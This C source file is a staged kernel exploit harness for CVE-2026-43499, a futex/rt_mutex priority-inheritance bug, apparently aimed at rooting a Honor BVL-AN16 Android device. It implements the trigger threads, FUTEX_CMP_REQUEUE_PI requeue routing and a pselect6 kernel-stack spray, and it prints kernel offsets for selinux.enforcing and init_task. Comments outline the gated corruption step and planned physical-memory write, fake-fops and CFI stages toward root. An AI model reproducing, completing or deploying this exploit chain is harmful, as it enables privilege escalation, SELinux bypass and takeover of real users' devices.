/* bvl_43499.c - BVL-AN16 CVE-2026-43499 (GhostLock / rt_mutex) exploit SCAFFOLD.
 *
 * ⚠ SCAFFOLD — DO NOT FIRE ON DEVICE YET.
 *   This file contains the DEVICE-INDEPENDENT TRIGGER HARNESS only:
 *   futex PI waiter + owner + consumer threads, FUTEX_CMP_REQUEUE_PI routing,
 *   and the pselect6 stack-spray canvas. It is faithfully ported from the proven
 *   honor-BVL-AN16 exploit (refs/cve-2026-43499-honor, src/main.c).
 *
 *   It is SAFE TO RUN as a diagnostic: the actual kernel corruption / write
 *   primitive is GATED behind BVL43499_UNSAFE_FIRE and is OFF by default.
 *   Firing the corruption without the Phase-2 controlled stack layout (which the
 *   honor reference establishes via slide-leak + pipe-buffer physrw + fake-fops
 *   CFI staging) will panic the device.
 *
 *   The real win primitive lives in honor's slide.c / pipe.c / fops.c / root.c
 *   and is ported in Phase 2. Until then this harness only validates the trigger
 *   threading + pselect spray sync and reports the verified offsets.
 *
 * Proven on MEY-AN00 (same SM8735 SoC, 6.6.118) via H232-H243. BVL 6.1.157 is
 * older than the disputed 6.1.175 fix and AOSP common 6.1.177 carries no
 * GhostLock/43499 fix marker => BVL is unpatched.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <time.h>
#include <stdatomic.h>
#include <sys/mman.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <linux/futex.h>

#include "bvl_43499.h"

/* ---- futex PI uaddrs (process-shared via MAP_SHARED) ---- */
static uint32_t *g_f_wait;
static uint32_t *g_f_pi_target;
static uint32_t *g_f_pi_chain;

/* ---- trigger sync (mirrors honor main.c) ---- */
static atomic_int g_waiter_ready     = 0;
static atomic_int g_waiter_waiting   = 0;
static atomic_int g_owner_started    = 0;
static atomic_int g_route_done       = 0;
static atomic_int g_waiter_tid       = 0;
static atomic_int g_stop             = 0;

#define ROUTE_WAIT_SECONDS        8
#define PSELECT_ENTER_DELAY_USEC  50000
#define PSELECT_CONSUMER_NICE     19
#define PSELECT_ROUTE_NFDS        320

static long futex_op(uint32_t *uaddr, int op, uint32_t val,
                     const struct timespec *ts, uint32_t *uaddr2, uint32_t val3) {
    return syscall(SYS_futex, uaddr, op, val, ts, uaddr2, val3);
}

/* pselect6 stack spray: copies a controlled fd_set deep onto the kernel stack,
 * establishing the canvas that the stack-allocated rt_mutex_waiter later
 * overlaps. Proven MEY/honor technique. (Safe: just copies bytes, no corrupt.) */
static void do_pselect_fake_lock_route(void) {
    fd_set in, out, ex;
    FD_ZERO(&in); FD_ZERO(&out); FD_ZERO(&ex);
    memset(&in,  0x41, sizeof(in));
    memset(&out, 0x41, sizeof(out));
    memset(&ex,  0x41, sizeof(ex));
    struct timespec tv = {0, 0};
    pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &tv, NULL);
}

static void *waiter_thread(void *arg) {
    (void)arg;
    int tid = (int)syscall(SYS_gettid);
    atomic_store(&g_waiter_tid, tid);

    if (futex_op(g_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
        fprintf(stderr, "[w] lock chain errno=%d\n", errno);
    }
    atomic_store(&g_waiter_ready, 1);
    while (!atomic_load(&g_owner_started) && !atomic_load(&g_stop))
        usleep(1000);

    struct timespec timeout;
    clock_gettime(CLOCK_MONOTONIC, &timeout);
    timeout.tv_sec += ROUTE_WAIT_SECONDS;

    atomic_store(&g_waiter_waiting, 1);
    futex_op(g_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, g_f_pi_target, 0);

    do_pselect_fake_lock_route();
    atomic_store(&g_route_done, 1);

    futex_op(g_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    return NULL;
}

static void *owner_thread(void *arg) {
    (void)arg;
    if (futex_op(g_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
        fprintf(stderr, "[o] lock target errno=%d\n", errno);
    }
    while (!atomic_load(&g_waiter_ready) && !atomic_load(&g_stop))
        usleep(1000);
    atomic_store(&g_owner_started, 1);
    futex_op(g_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

    /* Hold the target lock so the waiter stays requeued, until told to stop. */
    while (!atomic_load(&g_stop))
        usleep(100000);
    futex_op(g_f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    return NULL;
}

static void *consumer_thread(void *arg) {
    (void)arg;
    /* In the real exploit this thread fires the 43499 corruption by calling
     * sched_setattr(waiter_tid, nice) which re-walks the rt_mutex PI chain and,
     * with the pselect-sprayed waiter struct overlapping its own rb_node, writes
     * through. GATED OFF here — Phase 2 wires the controlled layout + physrw. */
    while (!atomic_load(&g_stop))
        usleep(100000);
    return NULL;
}

static void reset_state(void) {
    g_f_wait = g_f_pi_target = g_f_pi_chain = 0;
    atomic_store(&g_waiter_ready, 0);
    atomic_store(&g_waiter_waiting, 0);
    atomic_store(&g_owner_started, 0);
    atomic_store(&g_route_done, 0);
    atomic_store(&g_waiter_tid, 0);
    atomic_store(&g_stop, 0);
}

char *bvl43499_run(int duration_sec) {
    static char out[8192];
    memset(out, 0, sizeof(out));
    int off = 0;

    g_f_wait = (uint32_t *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                                MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    g_f_pi_target = (uint32_t *)((char *)g_f_wait + 0x100);
    g_f_pi_chain  = (uint32_t *)((char *)g_f_wait + 0x200);
    if (g_f_wait == MAP_FAILED) {
        snprintf(out, sizeof out, "mmap fail");
        return strdup(out);
    }

    reset_state();

    off += snprintf(out + off, sizeof(out) - off,
        "[43499] BVL CVE-2026-43499 trigger scaffold started (%d sec)\n",
        duration_sec);
    off += snprintf(out + off, sizeof(out) - off,
        "[43499] KASLR slide == 0 (confirmed). kernel_base=%016llx\n",
        (unsigned long long)KERNEL_IMG_BASE);
    off += snprintf(out + off, sizeof(out) - off,
        "[43499] verified offsets: waiter tree@0 pri@0x18 task@0x30 lock@0x38; "
        "ts pi_lock@0x92c pi_blocked_on@0x958; "
        "selinux.enforcing@%016llx init_task@%016llx\n",
        (unsigned long long)K_SELINUX_ENFORCING,
        (unsigned long long)K_INIT_TASK);
    off += snprintf(out + off, sizeof(out) - off,
        "[43499] SCAFFOLD: corruption fire GATED (BVL43499_UNSAFE_FIRE off).\n"
        "        Phase 2 ports the win primitive (slide/pipe/fops/CFI) from the\n"
        "        honor-BVL-AN16 reference. This build only validates the futex\n"
        "        waiter/owner/consumer threading + pselect spray sync.\n");

    pthread_t tw, to, tc;
    pthread_create(&tw, NULL, waiter_thread, NULL);
    pthread_create(&to, NULL, owner_thread, NULL);
    pthread_create(&tc, NULL, consumer_thread, NULL);

    /* Wait until the waiter is requeued + owner started, then route. */
    while ((!atomic_load(&g_waiter_waiting) || !atomic_load(&g_owner_started))
           && !atomic_load(&g_stop))
        usleep(1000);
    usleep(100000);
    futex_op(g_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, g_f_pi_target, 0);

    sleep(duration_sec);
    atomic_store(&g_stop, 1);

    off += snprintf(out + off, sizeof(out) - off,
        "[43499] done. waiter_ready=%d waiter_waiting=%d owner_started=%d "
        "route_done=%d waiter_tid=%d\n",
        (int)g_waiter_ready, (int)g_waiter_waiting, (int)g_owner_started,
        (int)g_route_done, (int)g_waiter_tid);
    off += snprintf(out + off, sizeof(out) - off,
        "[43499] NEXT: enable BVL43499_UNSAFE_FIRE only after Phase 2 wires the\n"
        "        controlled stack layout + physrw; otherwise this is panic-safe.\n");
    return strdup(out);
}
